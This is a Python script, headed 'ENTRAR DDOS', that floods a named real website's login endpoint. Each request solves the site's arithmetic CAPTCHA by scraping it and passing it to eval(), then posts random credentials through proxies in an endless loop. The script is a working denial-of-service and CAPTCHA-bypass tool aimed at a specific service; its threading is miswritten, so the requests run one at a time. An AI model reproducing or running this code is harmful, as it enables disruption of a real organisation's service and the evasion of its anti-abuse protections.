import requests
import random
import json
from bs4 import BeautifulSoup as BS
from colorama import Fore
import threading
from proxies import proxy

print(
    """
ミ★ 𝘌𝘕𝘛𝘙𝘈𝘙 𝘋𝘋𝘖𝘚 ★彡
"""
)


class Console:
    def captcha_solve():
        url = requests.get("https://entrar.in/login/login", proxies=proxy, timeout=5)
        soup = BS(url.content, features="html.parser")
        soup = soup.find("div", {"class": "col-lg-3 col-sm-3"})
        captcha = soup.text.replace(" =", "")
        captcha = eval(captcha)
        return captcha

    def rand_gen_user():
        user = "".join(random.choice("123456789") for _ in range(8))
        user = "B/" + user
        return user

    def rand_gen_pass():
        password = "".join(random.choice("123456789abcdefghijklmnopqrstuvwxyz") for _ in range(8))
        return password


def send_req():
    user = Console.rand_gen_user()
    password = Console.rand_gen_pass()
    captcha = Console.captcha_solve()
    payload = {"username": user, "password": password, "captcha": captcha}
    req = requests.post(
        "https://entrar.in/login/auth", data=bytes(json.dumps(payload), encoding="utf-8"), proxies=proxy, timeout=5
    )
    print(Fore.LIGHTYELLOW_EX, "Request Sent to ------->", req.url)


threads = [
    threading.Thread(target=send_req()),
    threading.Thread(target=send_req()),
    threading.Thread(target=send_req()),
    threading.Thread(target=send_req()),
    threading.Thread(target=send_req()),
]


def run():
    for _ in range(10):
        t = threading.Thread(target=send_req())
    t.start()


while True:
    run()
